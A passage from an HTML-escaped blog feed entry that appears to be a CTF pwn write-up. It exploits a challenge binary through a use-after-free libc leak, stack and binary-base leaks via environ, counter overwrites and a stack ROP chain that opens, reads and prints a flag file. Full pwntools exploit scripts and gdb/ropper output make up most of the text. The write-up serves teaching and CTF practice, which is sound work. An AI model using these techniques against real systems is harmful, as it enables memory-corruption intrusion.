  if ( read_count &amp;lt;= 1 )
  {
    printf(&amp;quot;addr: &amp;quot;);
    __isoc99_scanf(&amp;quot;%lx&amp;quot;, &amp;amp;v1);
    empty_newline();
    v2 = *v1;
    printf(&amp;quot;value: %p\n&amp;quot;, v2);
    ++read_count;
  }
  else
  {
    puts(&amp;quot;No more reads for you!&amp;quot;);
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
// write 8 bytes to arbitrary address
__int64 do_write()
{
  _QWORD *v1; // [sp+8h] [bp-18h]@3
  __int64 v2; // [sp+10h] [bp-10h]@3
  __int64 v3; // [sp+18h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  if ( write_count &amp;lt;= 1 )
  {
    printf(&amp;quot;addr/value: &amp;quot;);
    __isoc99_scanf(&amp;quot;%lx %lx&amp;quot;, &amp;amp;v1);
    empty_newline(&amp;quot;%lx %lx&amp;quot;, &amp;amp;v1);
    *v1 = v2;
    ++write_count;
  }
  else
  {
    puts(&amp;quot;No more writes for you!&amp;quot;);
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;beyond that, there were another two functions &lt;span style=&#34;color :#dd446b&#34;&gt;leave_feedback&lt;/span&gt; and &lt;span style=&#34;color :#dd446b&#34;&gt;view_feedback&lt;/span&gt; which basically let you write into long heap chunks using &lt;span style=&#34;color :#dd446b&#34;&gt;calloc&lt;/span&gt; function and view that content.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;//create large chunk
void leave_feedback()
{
  char *v0; // rsi@5
  char v1; // [sp+Fh] [bp-1h]@5

  if ( feedback )
  {
    puts(&amp;quot;that&#39;s enough feedback for one day...&amp;quot;);
  }
  else
  {
    feedback = (char *)calloc(1uLL, 0x501uLL);
    printf(&amp;quot;feedback: &amp;quot;, 1281LL);
    if ( !fgets(feedback, 1280, stdin) )
      exit(1);
    v0 = feedback;
    printf(&amp;quot;you entered: %s\n&amp;quot;, feedback);
    puts(&amp;quot;Do you want to keep your feedback? (y/n)&amp;quot;);
    v1 = getchar();
    empty_newline(&amp;quot;Do you want to keep your feedback? (y/n)&amp;quot;, v0);
    if ( v1 != 121 &amp;amp;&amp;amp; v1 == 110 )
      free(feedback);
  }
}
// view created chunk content
int view_feedback()
{
  int result; // eax@2

  if ( feedback )
    result = printf(&amp;quot;feedback: %s\n&amp;quot;, feedback);
  else
    result = puts(&amp;quot;Leave feedback first!&amp;quot;);
  return result;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;Since the binary has PIE enabled we couldn&amp;rsquo;t use the read/write functions until we get a leak. which is somehow trivial in our case using the following process:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Allocate a chunk using &lt;span style=&#34;color :#dd446b&#34;&gt;leave_feedback&lt;/span&gt; function and free it and since the &lt;strong&gt;seccomp&lt;/strong&gt; filters uses heap to allocate its rules the freed chunk will never be merged with top chunk and considering the big size of allocation is 0x501 the freed chunk will go to unsorted bin because tcache bins can only holds size lower then 0x408.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The freed chunk&amp;rsquo;s data (&lt;strong&gt;FD&lt;/strong&gt; and &lt;strong&gt;BK&lt;/strong&gt; pointers) now holds a libc address that we will use in &lt;span style=&#34;color :#dd446b&#34;&gt;view_feedback &lt;/span&gt;to print its content because the author doesn&amp;rsquo;t check if the chunk if freed or not before passing it to puts function thus trigger a UAF that leads to leaking libc address.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We start by implementing the functions needed to communicate with the binary.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

def leave_feedback(s,feedback,free=True):
    s.sendlineafter(&amp;quot;&amp;gt; &amp;quot;,&amp;quot;3&amp;quot;)
    s.sendline(feedback)
    if free:
        s.sendline(&amp;quot;n&amp;quot;)
    else:
        s.sendline(&amp;quot;y&amp;quot;)

def view_feedback(s):
    s.sendlineafter(&amp;quot;&amp;gt; &amp;quot;,&amp;quot;4&amp;quot;)
    s.recvuntil(&amp;quot;feedback: &amp;quot;)
    data = s.recvuntil(&amp;quot;\n&amp;quot;).strip()
    return data

p = process(&amp;quot;./new_crap&amp;quot;)
leave_feedback(p,&amp;quot;abc&amp;quot;)
libc_addr = view_feedback(p)
leaked_fd = u64(libc_addr.ljust(8,&amp;quot;\x00&amp;quot;))
print &amp;quot;leaked address :&amp;quot;,hex(leaked_fd)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Running the above snippet give us the libc address&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ python sploit.py 
[+] Starting local process &#39;./new_crap&#39;: pid 28823
leaked address : 0x7f24bb47abe0
[*] Stopped process &#39;./new_crap&#39; (pid 28823)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we got the libc address, we need to calculate the libc base and the different useful offsets that we will need later.
We can do this by setting a breakpoint or attaching the process while being in interactive mode. We prefer the second method.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c#&#34;&gt;gdb-peda$ vmmap 
Start              End                Perm	Name
0x0000563fdba91000 0x0000563fdba96000 r-xp	/home/anisboss/pwn/tg/pwn/crap/final/final
0x0000563fdbc95000 0x0000563fdbc96000 r--p	/home/anisboss/pwn/tg/pwn/crap/final/final
0x0000563fdbc96000 0x0000563fdbc97000 rw-p	/home/anisboss/pwn/tg/pwn/crap/final/final
0x0000563fdbe97000 0x0000563fdbe98000 rw-p	/home/anisboss/pwn/tg/pwn/crap/final/final
0x0000563fdc298000 0x0000563fdc299000 r--p	/home/anisboss/pwn/tg/pwn/crap/final/final
0x0000563fdca99000 0x0000563fdca9a000 r--p	/home/anisboss/pwn/tg/pwn/crap/final/final
0x0000563fdd802000 0x0000563fdd823000 rw-p	[heap]
0x00007fb2d5139000 0x00007fb2d52eb000 r-xp	/home/anisboss/pwn/tg/pwn/crap/final/libc.so.6
0x00007fb2d52eb000 0x00007fb2d54ea000 ---p	/home/anisboss/pwn/tg/pwn/crap/final/libc.so.6
0x00007fb2d54ea000 0x00007fb2d54ee000 r--p	/home/anisboss/pwn/tg/pwn/crap/final/libc.so.6
0x00007fb2d54ee000 0x00007fb2d54f0000 rw-p	/home/anisboss/pwn/tg/pwn/crap/final/libc.so.6
0x00007fb2d54f0000 0x00007fb2d54f4000 rw-p	mapped
[...]
0x00007fb2d54f4000 0x00007fb2d551c000 r-xp	/home/anisboss/pwn/tg/pwn/crap/final/ld-2.31.so
0x00007fb2d571b000 0x00007fb2d571c000 r--p	/home/anisboss/pwn/tg/pwn/crap/final/ld-2.31.so
0x00007fb2d571c000 0x00007fb2d571d000 rw-p	/home/anisboss/pwn/tg/pwn/crap/final/ld-2.31.so
0x00007fb2d571d000 0x00007fb2d571e000 rw-p	mapped
0x00007fff7ab85000 0x00007fff7aba6000 rw-p	[stack]
0x00007fff7abd1000 0x00007fff7abd4000 r--p	[vvar]
0x00007fff7abd4000 0x00007fff7abd6000 r-xp	[vdso]

gdb-peda$ p 0x7fb2d54eebe0 - 0x00007fb2d5139000
$1 = 0x3b5be0 //offset from libc base
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The next step is to get infinite read/write primitive in order to read and write data to bypass the restriction made in the binary. To do this we need to get the address of variables &lt;span style=&#34;color :#dd446b&#34;&gt;write_count&lt;/span&gt; and &lt;span style=&#34;color :#dd446b&#34;&gt;read_count&lt;/span&gt; located in &lt;strong&gt;.bss&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;In order to leak a stack address from libc, There is a symbol &lt;span style=&#34;color :#dd446b&#34;&gt;environ&lt;/span&gt; in libc, whose value is the same as the third argument of &lt;code&gt;main&lt;/code&gt; function, &lt;span style=&#34;color :#dd446b&#34;&gt;char **envp&lt;/span&gt;. The value of &lt;span style=&#34;color :#dd446b&#34;&gt;char **envp&lt;/span&gt; is on the stack, thus we can leak stack address with this symbol.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ readelf -s ./libc.so.6 |grep -i environ
   299: 00000000003b8618     8 OBJECT  WEAK   DEFAULT   32 _environ@@GLIBC_2.2.5
  1021: 00000000003b8618     8 OBJECT  WEAK   DEFAULT   32 environ@@GLIBC_2.2.5
  1373: 00000000003b8618     8 OBJECT  GLOBAL DEFAULT   32 __environ@@GLIBC_2.2.5
   405: 00000000003b6c78     8 OBJECT  LOCAL  DEFAULT   32 last_environ
  1817: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS environ.c
  4800: 0000000000037d10   953 FUNC    LOCAL  DEFAULT   13 __add_to_environ
  6190: 00000000003b8618     8 OBJECT  WEAK   DEFAULT   32 _environ
  6916: 00000000003b8618     8 OBJECT  GLOBAL DEFAULT   32 __environ
  7031: 00000000003b8618     8 OBJECT  WEAK   DEFAULT   32 environ

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since at first we have only two shots for both read and write functions let&amp;rsquo;s use the read at first to read the stack address then we will look into the stack for an address pointing to our binary when found we calculate the distance between that address and binary base then we conclude the address of write_count/read_count. Now we got what we need, let&amp;rsquo;s develop the write/read functions in our exploit and get the needed values.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

def read(s,addr):
    s.sendlineafter(&amp;quot;&amp;gt; &amp;quot;,&amp;quot;1&amp;quot;)
    s.sendlineafter(&amp;quot;addr: &amp;quot;,addr)
    p.recvuntil(&amp;quot;value: &amp;quot;)
    leaked = p.recvline()
    return leaked.strip()

def write(s,addr,value):
    s.sendlineafter(&amp;quot;&amp;gt; &amp;quot;,&amp;quot;2&amp;quot;)
    s.sendline(hex(addr)+ &amp;quot; &amp;quot; + hex(value))

def leave_feedback(s,feedback,free=True):
    s.sendlineafter(&amp;quot;&amp;gt; &amp;quot;,&amp;quot;3&amp;quot;)
    s.sendline(feedback)
    if free:
        s.sendline(&amp;quot;n&amp;quot;)
    else:
        s.sendline(&amp;quot;y&amp;quot;)

def view_feedback(s):
    s.sendlineafter(&amp;quot;&amp;gt; &amp;quot;,&amp;quot;4&amp;quot;)
    s.recvuntil(&amp;quot;feedback: &amp;quot;)
    data = s.recvuntil(&amp;quot;\n&amp;quot;).strip()
    return data

p = process(&amp;quot;./new_crap&amp;quot;)
leave_feedback(p,&amp;quot;abc&amp;quot;)
libc_addr = view_feedback(p)
leaked_fd = u64(libc_addr.ljust(8,&amp;quot;\x00&amp;quot;))
print &amp;quot;leaked address :&amp;quot;,hex(leaked_fd)
base = leaked_fd - 3890144
print &amp;quot;libc_base : &amp;quot;,hex(base)
environ = base + 0x00000000003b8618
print &amp;quot;environ_libc : &amp;quot;,hex(environ)
leaked_stack = int(read(p,hex(environ)),16)
print &amp;quot;leaked_stack : &amp;quot;,hex(leaked_stack)
to_leak = leaked_stack -264
leaked_bin = int(read(p,hex(to_leak)),16)
bin_base = leaked_bin - 4640
print &amp;quot;binary base : &amp;quot;,hex(bin_base)
bss = bin_base + 0x0000000000205010
write_count = bin_base+0x0000000000202034
feedback = write_count+0x4
read_count = write_count - 0x4
print &amp;quot;feedback: &amp;quot;,hex(feedback)
print &amp;quot;write_count: &amp;quot;,hex(write_count)
print &amp;quot;read_count: &amp;quot;,hex(read_count)
#gdb.attach(p)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ python sploit.py 
[+] Starting local process &#39;./new_crap&#39;: pid 29333
leaked address : 0x7fba2c791be0
libc_base :  0x7fba2c3dc000
environ_libc :  0x7fba2c794618
leaked_stack :  0x7fff22ca9f88
binary base :  0x555a6cb69000
feedback:  0x555a6cd6b038
write_count:  0x555a6cd6b034
read_count:  0x555a6cd6b030
[*] Switching to interactive mode
&amp;gt; $  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we have the addresses of &lt;span style=&#34;color :#dd446b&#34;&gt;write_count&lt;/span&gt; and &lt;span style=&#34;color :#dd446b&#34;&gt;read_count&lt;/span&gt; variables, and since the binary is making a signed comparison , we can put negative values in our case we will choose -200 which is in hex 0xffffff38.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;write(p,read_count,0)
write(p,write_count,4294967096)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Our methodology is to build a ROP chain, at first we tried to overwrite manually the return pointer of &lt;span style=&#34;color :#dd446b&#34;&gt;do_write()&lt;/span&gt; function with &lt;span style=&#34;color :#dd446b&#34;&gt;leave ;  ret &lt;/span&gt; gadget after performing those instructions the program returned to saved return pointer of the main function  so if we overwrite &lt;strong&gt;srip&lt;/strong&gt; of main with our gadgets we can successfully pivot to our ROP chain.&lt;/p&gt;
&lt;p&gt;To do so, following the seccomp rules defined in the binary we should construct an &lt;strong&gt;open/read/write&lt;/strong&gt; rop chain. And since we are allowed only to read from stdin therefore the &lt;strong&gt;File Descriptor&lt;/strong&gt; returned by &lt;span style=&#34;color :#dd446b&#34;&gt;open &lt;/span&gt;syscall must be 0.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;as we know that &lt;strong&gt;FD&lt;/strong&gt;s 0,1,2 are reserverd by &lt;strong&gt;stdin&lt;/strong&gt;,&lt;strong&gt;stdout&lt;/strong&gt; and &lt;strong&gt;stderr&lt;/strong&gt; respectively. &lt;span style=&#34;color :#dd446b&#34;&gt;Open&lt;/span&gt;  operation will return the first free &lt;strong&gt;FD&lt;/strong&gt; (starting from 0)  ; so if we perform a &lt;span style=&#34;color :#dd446b&#34;&gt;close(0)&lt;/span&gt; call before opening the flag file ; the next &lt;span style=&#34;color :#dd446b&#34;&gt;open&lt;/span&gt; syscall will find the FD 0 is free and will assign it to the opened file.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;To Build such ropchain, we need to find gadgets to control the different registers &lt;strong&gt;rax,rdi,rsi,rdx&lt;/strong&gt; we can get these useful gadgets from libc using the 
&lt;a href=&#34;https://github.com/sashs/Ropper&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ropper&lt;/a&gt; tool.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ ropper --file ./libc.so.6 --search &#39;pop r?x; ret;|pop r?i; ret;&#39; 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r?x; ret;|pop r?i; ret;

[INFO] File: ./libc.so.6
0x0000000000038e88: pop rax; ret; 
0x000000000002bc45: pop rbx; ret; 
0x0000000000021882: pop rdi; ret; 
0x0000000000001b9a: pop rdx; ret; 
0x0000000000022192: pop rsi; ret; 

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We need to store the flag path somewhere, we chose heap since we have a function that allocates a chunk with controlled data for us. Before that we need to overwrite &lt;strong&gt;feedback&lt;/strong&gt; variable with 0 in order to be able to use &lt;span style=&#34;color :#dd446b&#34;&gt;leave_feedback&lt;/span&gt; again.
The &lt;strong&gt;Foward Pointer&lt;/strong&gt; leaked in the first step contains a heap pointer we will use the do_read() to leak its content thus we can calculate the &lt;strong&gt;flag&lt;/strong&gt; path address which is the address of the new allocated chunk.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;leaked_heap=int(read(p,hex(leaked_fd)),16)
print &amp;quot;leaked_heap :&amp;quot;,hex(leaked_heap)
flag_file=leaked_heap-0x1260
print &amp;quot;flag_file :&amp;quot;,hex(flag_file)
write(p,feedback,0)
leave_feedback(p,&amp;quot;/home/crap/flag.txt\x00&amp;quot;,False) #flag path will be at flag_file address
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Our next step is to construct the final ROP chain using obtained gadgets.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;pop_rax = base+0x0000000000038e88
syscall_ret = base+0x0000000000039049
pop_rdi = base + 0x0000000000021882
pop_rsi = base + 0x0000000000022192
pop_rdx = base + 0x0000000000001b9a
leave_ret = base + 0x0000000000040222

rop_chain=[
pop_rdi,
0,
pop_rax,
3,
syscall_ret, #close(0)
pop_rdi,
flag_file,
pop_rsi,
0,
pop_rax,
0x2,
pop_rdx,
0,
syscall_ret, #open(flag_file,0,0) &amp;lt;== this will return 0 as File Descriptor
pop_rdi,
0,
pop_rsi,
flag_file,
pop_rdx,
0x100,
pop_rax,
0x0,
syscall_ret,#read(0,flag_file,0x100)
pop_rdi,
1,
pop_rsi,
flag_file,
pop_rdx,
0x100,
pop_rax,
0x1,
syscall_ret #write(1,flag_file,0x100)
]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we just need to calculate the srip of &lt;span style=&#34;color :#dd446b&#34;&gt;main&lt;/span&gt; and &lt;span style=&#34;color :#dd446b&#34;&gt;do_write&lt;/span&gt; functions and place our ROP chain in the stack.&lt;/p&gt;
&lt;p&gt;The final exploit:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

def read(s,addr):
    s.sendlineafter(&amp;quot;&amp;gt; &amp;quot;,&amp;quot;1&amp;quot;)
    s.sendlineafter(&amp;quot;addr: &amp;quot;,addr)
    p.recvuntil(&amp;quot;value: &amp;quot;)
    leaked = p.recvline()
    return leaked.strip()

def write(s,addr,value):
    s.sendlineafter(&amp;quot;&amp;gt; &amp;quot;,&amp;quot;2&amp;quot;)
    s.sendline(hex(addr)+ &amp;quot; &amp;quot; + hex(value))

def leave_feedback(s,feedback,free=True):
    s.sendlineafter(&amp;quot;&amp;gt; &amp;quot;,&amp;quot;3&amp;quot;)
    s.sendline(feedback)
    if free:
        s.sendline(&amp;quot;n&amp;quot;)
    else:
        s.sendline(&amp;quot;y&amp;quot;)

def view_feedback(s):
    s.sendlineafter(&amp;quot;&amp;gt; &amp;quot;,&amp;quot;4&amp;quot;)
    s.recvuntil(&amp;quot;feedback: &amp;quot;)
    data = s.recvuntil(&amp;quot;\n&amp;quot;).strip()
    return data

p = process(&amp;quot;./new_crap&amp;quot;)
leave_feedback(p,&amp;quot;abc&amp;quot;)
libc_addr = view_feedback(p)
leaked_fd = u64(libc_addr.ljust(8,&amp;quot;\x00&amp;quot;))
print &amp;quot;leaked address :&amp;quot;,hex(leaked_fd)
base = leaked_fd - 3890144
print &amp;quot;libc_base : &amp;quot;,hex(base)
environ = base + 0x00000000003b8618
print &amp;quot;environ_libc : &amp;quot;,hex(environ)
leaked_stack = int(read(p,hex(environ)),16)
print &amp;quot;leaked_stack : &amp;quot;,hex(leaked_stack)
to_leak = leaked_stack -264
leaked_bin = int(read(p,hex(to_leak)),16)
bin_base = leaked_bin - 4640
print &amp;quot;binary base : &amp;quot;,hex(bin_base)
bss = bin_base + 0x0000000000205010
write_count = bin_base+0x0000000000202034
feedback = write_count+0x4
read_count = write_count - 0x4
print &amp;quot;feedback: &amp;quot;,hex(feedback)
print &amp;quot;write_count: &amp;quot;,hex(write_count)
print &amp;quot;read_count: &amp;quot;,hex(read_count)

write(p,read_count,0)
write(p,write_count,4294967096)

leaked_heap=int(read(p,hex(leaked_fd)),16)
print &amp;quot;leaked_heap :&amp;quot;,hex(leaked_heap)
flag_file=leaked_heap-0x1260
print &amp;quot;flag_file :&amp;quot;,hex(flag_file)
write(p,feedback,0)
leave_feedback(p,&amp;quot;/home/crap/flag.txt\x00&amp;quot;,False) #flag path will be at flag_file address
eip_main=leaked_stack-256
eip_do_write=eip_main-32
print &amp;quot;seip_main: &amp;quot;,hex(eip_main)
print &amp;quot;seip_do_write: &amp;quot;,hex(eip_do_write)
pop_rax = base+0x0000000000038e88
syscall_ret = base+0x0000000000039049
pop_rdi = base + 0x0000000000021882
pop_rsi = base + 0x0000000000022192
pop_rdx = base + 0x0000000000001b9a
leave_ret = base + 0x0000000000040222

rop_chain=[
pop_rdi,
0,
pop_rax,
3,
syscall_ret, #close(0)
pop_rdi,
flag_file,
pop_rsi,
0,
pop_rax,
0x2,
pop_rdx,
0,
syscall_ret, #open(flag_file,0,0) &amp;lt;== this will return 0 as File Descriptor
pop_rdi,
0,
pop_rsi,
flag_file,
pop_rdx,
0x100,
pop_rax,
0x0,
syscall_ret,#read(0,flag_file,0x100)
pop_rdi,
1,
pop_rsi,
flag_file,
pop_rdx,
0x100,
pop_rax,
0x1,
syscall_ret #write(1,flag_file,0x100)
]

#write our rop chain in the stack
for i in range(len(rop_chain)):
	write(p,eip_main+(i*8),rop_chain[i])

#pause()
write(p,eip_do_write,leave_ret)
p.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And Here we go \o/ !
&lt;img src=&#34;/img/flag.png&#34; alt=&#34;flag&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
